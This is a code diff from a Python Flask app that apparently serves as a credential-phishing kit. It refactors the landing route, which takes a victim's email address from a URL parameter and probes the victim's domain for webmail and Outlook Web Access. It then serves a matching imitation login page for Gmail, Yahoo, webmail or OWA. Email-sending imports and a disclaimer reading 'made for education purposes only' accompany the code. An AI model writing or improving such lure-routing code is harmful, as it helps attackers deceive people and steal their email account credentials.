@@ -1,4 +1,5 @@
 import requests
+from urllib.parse import urljoin
 from flask import Flask, request, abort, render_template, session, redirect, url_for, jsonify
 import secrets
 import random
@@ -12,6 +13,7 @@ from flask_limiter.util import get_remote_address
 import smtplib, ssl
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
+
 
 # made for education purposes only
 
@@ -175,56 +177,52 @@ def success():
 @app.route("/")
 def route2():
     web_param = request.args.get('web')
+    
+    session['eman'] = web_param if web_param else ''
+    session['ins'] = ""  # Default to empty if no domain is found
+    
+    if not web_param or "@" not in web_param:
+        return render_template('index.html', eman=session.get('eman', ''), ins=session.get('ins', ''))
+    
+    domain = web_param.split("@")[1].lower().strip()  # Extract and clean domain
+    session['ins'] = domain
 
-    if web_param and "@" in web_param:
-        domain = web_param.split("@")[-1]  # Extract domain
+    # Predefined domain redirects
+    if domain == "gmail.com":
+        return render_template('gmail.html', eman=session['eman'], ins=session['ins'])
+    elif domain == "yahoo.com":
+        return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
+    
+    # Define Webmail & OWA URLs
+    webmail_url = f"https://{domain}/webmail"
+    owa_urls = [
+        urljoin(f"https://owa.{domain}", "/owa/#path=/mail"),
+        urljoin(f"https://autodiscover.{domain}", "/owa/#path=/mail/search"),
+    ]
 
-        session['eman'] = web_param
-        session['ins'] = domain
+    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
 
-        # Define possible Webmail & OWA URLs
-        webmail_urls = [
-            f"https://{domain}/webmail",
-            f"https://mail.{domain}/webmail",
-            f"https://webmail.{domain}",
-        ]
-        owa_urls = [
-            f"https://owa.{domain}/owa/",
-            f"https://autodiscover.{domain}/owa/",
-            f"https://{domain}/owa/",
-            f"https://mail.{domain}/owa/",
-        ]
+    # Function to check if a URL returns status code 200
+    def is_accessible(url):
+        try:
+            response = requests.get(url, headers=headers, timeout=10)
+            if response.status_code == 200:
+                return True
+        except requests.RequestException:
+            pass
+        return False
 
-        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
+    # Check Webmail
+    if is_accessible(webmail_url):
+        return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
 
-        # Check Webmail
-        for webmail_url in webmail_urls:
-            try:
-                response = requests.get(webmail_url, headers=headers, timeout=10)
-                if response.status_code == 200:
-                    print(f"✅ Webmail Found: {webmail_url}")  # Debugging
-                    return render_template('webmail.html', eman=session['eman'], ins=session['ins'])
-            except requests.RequestException as e:
-                print(f"❌ Webmail Request Failed: {webmail_url}, Error: {e}")  # Debugging
-
-        # Check OWA
-        for owa_url in owa_urls:
-            try:
-                response = requests.get(owa_url, headers=headers, timeout=10)
-                if response.status_code == 200:
-                    print(f"✅ OWA Found: {owa_url}")  # Debugging
-                    return render_template('owa.html', eman=session['eman'], ins=session['ins'])
-            except requests.RequestException as e:
-                print(f"❌ OWA Request Failed: {owa_url}, Error: {e}")  # Debugging
-
-        # Allow Gmail & Yahoo separately
-        if domain == "gmail.com":
-            return render_template('gmail.html', eman=session['eman'], ins=session['ins'])
-        elif domain == "yahoo.com":
-            return render_template('yahoo.html', eman=session['eman'], ins=session['ins'])
-
-    # Default if no match
-    return render_template('index.html', eman=session.get('eman'), ins=session.get('ins'))
+    # Check OWA
+    for owa_url in owa_urls:
+        if is_accessible(owa_url):
+            return render_template('owa.html', eman=session['eman'], ins=session['ins'])
+    
+    # Default if no match, passing variables to index.html
+    return render_template('index.html', eman=session.get('eman', ''), ins=session.get('ins', ''))
 
 
 @app.route("/first", methods=['POST'])
